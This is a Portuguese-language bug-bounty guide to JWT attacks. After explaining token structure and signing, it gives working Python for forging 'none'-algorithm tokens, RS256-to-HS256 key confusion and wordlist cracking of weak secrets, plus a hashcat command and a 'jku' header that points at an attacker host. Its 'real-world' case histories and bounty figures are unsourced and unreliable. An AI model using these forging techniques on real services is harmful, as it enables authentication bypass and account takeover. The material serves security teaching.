# JWT (JSON Web Token) Attacks

**Criticidade**: 🔴 Crítica (CVSS 8.5-10.0)
**Dificuldade**: 🔴 Avançada
**Bounty Médio**: $5,000 - $30,000 USD

---

## 📚 Índice

1. [JWT Architecture Deep Dive](#jwt-architecture-deep-dive)
2. [Cryptographic Foundations](#cryptographic-foundations)
3. [Attack Vectors](#attack-vectors)
4. [Algorithm Confusion Attacks](#algorithm-confusion-attacks)
5. [Signature Bypass Techniques](#signature-bypass-techniques)
6. [Key Confusion Attacks](#key-confusion-attacks)
7. [Implementation Vulnerabilities](#implementation-vulnerabilities)
8. [Real-World Exploits](#real-world-exploits)

---

## 🏗️ JWT Architecture Deep Dive

### Structure Specification (RFC 7519)

JWT consiste em 3 partes separadas por `.`:

```
HEADER.PAYLOAD.SIGNATURE
```

**Example:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### Part 1: Header

**Base64URL decoded:**
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Fields:**
- `alg`: Algorithm (HS256, RS256, ES256, none, etc.)
- `typ`: Token type (always "JWT")
- `kid`: Key ID (optional, usado para key rotation)
- `jku`: JWK Set URL (optional, aponta para public key)

**Base64URL Encoding Process:**

```python
import base64

def base64url_encode(data):
    # Standard base64
    encoded = base64.b64encode(data).decode('utf-8')

    # Replace characters
    encoded = encoded.replace('+', '-')  # + → -
    encoded = encoded.replace('/', '_')  # / → _
    encoded = encoded.rstrip('=')         # Remove padding

    return encoded

# Example
header = b'{"alg":"HS256","typ":"JWT"}'
encoded = base64url_encode(header)
# "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
```

### Part 2: Payload (Claims)

**Base64URL decoded:**
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "exp": 1516242622,
  "admin": false
}
```

**Registered Claims (RFC 7519):**

| Claim | Name | Description |
|-------|------|-------------|
| `iss` | Issuer | Quem criou o token |
| `sub` | Subject | Identificador do usuário |
| `aud` | Audience | Destinatário pretendido |
| `exp` | Expiration Time | Unix timestamp de expiração |
| `nbf` | Not Before | Token não válido antes deste tempo |
| `iat` | Issued At | Quando foi criado |
| `jti` | JWT ID | Identificador único |

**Custom Claims:**
- `admin`: boolean
- `role`: string
- `permissions`: array
- **Qualquer chave definida pela aplicação**

### Part 3: Signature

**Cálculo da assinatura:**

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
```

**Process detalhado:**

```python
import hmac
import hashlib

def create_signature(header_b64, payload_b64, secret):
    # Concatena header e payload
    message = f"{header_b64}.{payload_b64}".encode('utf-8')

    # HMAC-SHA256
    signature = hmac.new(
        secret.encode('utf-8'),
        message,
        hashlib.sha256
    ).digest()

    # Base64URL encode
    return base64url_encode(signature)

# Example
header = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
payload = "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ"
secret = "your-256-bit-secret"

signature = create_signature(header, payload, secret)
# "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
```

---

## 🔐 Cryptographic Foundations

### HMAC (Hash-based Message Authentication Code)

**Algorithm (RFC 2104):**

```
HMAC(K, m) = H((K ⊕ opad) || H((K ⊕ ipad) || m))

Onde:
K = secret key
m = message
H = hash function (SHA-256)
opad = 0x5c5c5c... (outer padding)
ipad = 0x363636... (inner padding)
⊕ = XOR operation
|| = concatenação
```

**Implementation (C-style pseudo-code):**

```c
unsigned char* hmac_sha256(unsigned char *key, int keylen,
                           unsigned char *msg, int msglen) {
    unsigned char ipad[64], opad[64];
    unsigned char inner_hash[32], result[32];

    // Padding key
    if (keylen > 64) {
        key = sha256(key, keylen);
        keylen = 32;
    }
    memset(ipad, 0x36, 64);
    memset(opad, 0x5c, 64);

    // XOR key with padding
    for (int i = 0; i < keylen; i++) {
        ipad[i] ^= key[i];
        opad[i] ^= key[i];
    }

    // Inner hash: H((K ⊕ ipad) || m)
    sha256_ctx ctx;
    sha256_init(&ctx);
    sha256_update(&ctx, ipad, 64);
    sha256_update(&ctx, msg, msglen);
    sha256_final(&ctx, inner_hash);

    // Outer hash: H((K ⊕ opad) || inner_hash)
    sha256_init(&ctx);
    sha256_update(&ctx, opad, 64);
    sha256_update(&ctx, inner_hash, 32);
    sha256_final(&ctx, result);

    return result;
}
```

**Security Properties:**
- Resistente a length extension attacks (diferente de simples `H(K||m)`)
- Computacionalmente inviável forjar sem conhecer `K`
- Requer `O(2^n)` tentativas para quebrar chave de `n` bits

### RSA Signature (RS256)

**Algorithm:**

```
1. Hash = SHA256(message)
2. Signature = Hash^d mod n    (usando private key)
3. Verify: Hash == Signature^e mod n    (usando public key)

Onde:
(n, e) = public key
(n, d) = private key
n = p * q (produto de primos grandes)
e = 65537 (comumente)
d = e^(-1) mod φ(n)
```

**Key generation:**

```python
from Crypto.PublicKey import RSA

# Gera par de chaves RSA-2048
key = RSA.generate(2048)

private_key = key.export_key()
public_key = key.publickey().export_key()

# Private key components
# n: modulus
# e: public exponent (65537)
# d: private exponent
# p, q: prime factors of n
```

**Signature creation:**

```python
from Crypto.Signature import pkcs1_15
from Crypto.Hash import SHA256

# Message to sign
message = b"header.payload"

# Hash message
h = SHA256.new(message)

# Sign with private key
signature = pkcs1_15.new(private_key).sign(h)

# Base64URL encode
signature_b64 = base64url_encode(signature)
```

**Verification:**

```python
# Parse public key
pub_key = RSA.import_key(public_key_pem)

# Verify
try:
    pkcs1_15.new(pub_key).verify(h, signature)
    print("Signature valid!")
except (ValueError, TypeError):
    print("Signature invalid!")
```

---

## ⚔️ Attack Vectors

### Attack 1: None Algorithm

**Vulnerability**: Alguns parsers aceitam `alg: "none"`

**Original token:**
```json
Header:  {"alg":"HS256","typ":"JWT"}
Payload: {"sub":"user","admin":false}
```

**Modified token:**
```json
Header:  {"alg":"none","typ":"JWT"}
Payload: {"sub":"user","admin":true}  ← Modified!
```

**Signature**: Empty (ou removida)

**Final token:**
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyIiwiYWRtaW4iOnRydWV9.
                                                                              ↑ Sem signature!
```

**Vulnerable code:**

```python
# ❌ VULNERÁVEL
def verify_token(token):
    header, payload, signature = token.split('.')

    header_json = json.loads(base64url_decode(header))
    payload_json = json.loads(base64url_decode(payload))

    alg = header_json['alg']

    if alg == 'none':
        # Aceita sem verificar signature!
        return payload_json

    elif alg == 'HS256':
        # Verifica signature...
        pass
```

**Exploitation:**

```python
import json
import base64

def create_none_token(payload):
    header = {"alg": "none", "typ": "JWT"}

    header_b64 = base64url_encode(json.dumps(header).encode())
    payload_b64 = base64url_encode(json.dumps(payload).encode())

    # Token sem signature (ou com ponto final)
    return f"{header_b64}.{payload_b64}."

# Bypass authentication
malicious_payload = {"sub": "admin", "admin": True}
token = create_none_token(malicious_payload)
# Use este token para acessar recursos admin!
```

### Attack 2: Algorithm Confusion (RS256 → HS256)

**Concept**: Forçar servidor a usar algoritmo errado

**Scenario:**
- Servidor usa **RS256** (RSA public/private key)
- Atacante força **HS256** (HMAC symmetric key)
- Servidor usa **public key** como **HMAC secret**!

**Why it works:**

```python
# Servidor (VULNERÁVEL):
def verify_token(token):
    header = parse_header(token)
    alg = header['alg']  # ← Atacante controla isso!

    if alg == 'HS256':
        # Usa public key como HMAC secret ❌
        return verify_hmac(token, public_key)

    elif alg == 'RS256':
        return verify_rsa(token, public_key)
```

**Exploitation:**

```python
# 1. Obter public key do servidor
# (geralmente disponível em /.well-known/jwks.json)
public_key_pem = """
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...
-----END PUBLIC KEY-----
"""

# 2. Criar token malicioso com HS256
from Crypto.PublicKey import RSA

header = {"alg": "HS256", "typ": "JWT"}  # ← Troca para HS256!
payload = {"sub": "admin", "admin": True}

header_b64 = base64url_encode(json.dumps(header).encode())
payload_b64 = base64url_encode(json.dumps(payload).encode())

message = f"{header_b64}.{payload_b64}"

# 3. Usa public key como HMAC secret
public_key = RSA.import_key(public_key_pem)
public_key_bytes = public_key.export_key('PEM')

signature = hmac.new(
    public_key_bytes,  # ← Public key como secret!
    message.encode(),
    hashlib.sha256
).digest()

signature_b64 = base64url_encode(signature)

malicious_token = f"{message}.{signature_b64}"
# Este token será aceito se servidor for vulnerável!
```

**Real-world impact:**
- Auth0 vulnerability (2015)
- Multiple JWT libraries affected
- Allows complete authentication bypass

### Attack 3: Weak Secret Brute Force

**Scenario**: Secret é fraco ou previsível

**Common weak secrets:**
```
"secret"
"password"
"123456"
"jwt_secret"
"my-secret-key"
[Nome do app]
[Domain name]
```

**Brute force attack:**

```python
import jwt
import hashlib

def crack_jwt_secret(token, wordlist):
    try:
        # Parse header e payload (não verifica signature ainda)
        unverified = jwt.decode(token, options={"verify_signature": False})
        alg = jwt.get_unverified_header(token)['alg']
    except:
        return None

    # Tenta cada senha do wordlist
    for secret in wordlist:
        try:
            # Tenta verificar com este secret
            decoded = jwt.decode(token, secret, algorithms=[alg])
            return secret  # ← Secret encontrado!
        except jwt.InvalidSignatureError:
            continue  # Tenta próximo
        except Exception:
            continue

    return None  # Não encontrado

# Uso
token = "eyJhbGc..."
wordlist = open('/usr/share/wordlists/rockyou.txt', 'r', errors='ignore')
secret = crack_jwt_secret(token, wordlist)

if secret:
    print(f"Secret cracked: {secret}")
    # Agora pode forjar tokens válidos!
else:
    print("Secret not found in wordlist")
```

**Optimization com HashCat:**

```bash
# Extrai JWT para formato HashCat
echo "eyJhbGc..." > jwt.txt

# Crack com GPU
hashcat -m 16500 jwt.txt rockyou.txt

# Formats:
# 16500 = JWT (HS256)
# 16501 = JWT (HS384)
# 16502 = JWT (HS512)
```

**Complexity analysis:**

```
Keyspace:
- lowercase only (26^n)
- alphanumeric (62^n)
- full ASCII (95^n)

Tempo para quebrar:
- "secret" (6 chars): microsegundos
- "MyS3cr3t" (8 chars): minutos
- "xK9#mQ2$pL4@" (12 chars, random): anos (brute force impraticável)

Rule of thumb:
- Secret length >= 256 bits (32 bytes)
- Gerado randomicamente (não palavras)
```

---

## 🔥 Real-World Exploits

### Case 1: Auth0 Algorithm Confusion (2015)

**Vulnerability**: RS256 ↔ HS256 confusion

**Impact**: Complete authentication bypass

**Affected**: 10,000+ applications

**Bounty**: N/A (responsibly disclosed)

**Exploitation:**
```python
# Public key obtido de /.well-known/jwks.json
public_key = get_public_key_from_jwks()

# Cria token com HS256 usando public key
header = {"alg": "HS256"}
payload = {"sub": "admin@victim.com"}

token = jwt.encode(payload, public_key, algorithm='HS256', headers=header)
# ← Este token será aceito como válido!
```

### Case 2: Zoom None Algorithm (2020)

**Vulnerability**: Aceita `alg: "none"`

**Impact**: Anyone could join any meeting

**Exploitation:**
```python
# Meeting ID obtido publicamente
meeting_id = "123-456-789"

# Cria token sem signature
header = {"alg": "none", "typ": "JWT"}
payload = {"meeting_id": meeting_id, "role": "host"}

token = f"{base64url_encode(json.dumps(header))}.{base64url_encode(json.dumps(payload))}."

# Usa token para entrar como host!
```

**Bounty**: $5,000 USD

### Case 3: GitLab JKU Injection (2019)

**Vulnerability**: JKU (JWK Set URL) não validado

**Exploitation:**
```json
// Header malicioso
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://evil.com/jwks.json"  ← Aponta para servidor do atacante!
}
```

**evil.com/jwks.json:**
```json
{
  "keys": [{
    "kty": "RSA",
    "kid": "gitlab-key",
    "use": "sig",
    "n": "ATTACKER_PUBLIC_KEY_MODULUS",
    "e": "AQAB"
  }]
}
```

**Impact**: Complete authentication bypass

**Bounty**: $20,000 USD

---

**Continua...**

**Última atualização**: 2024
**Versão**: 1.0
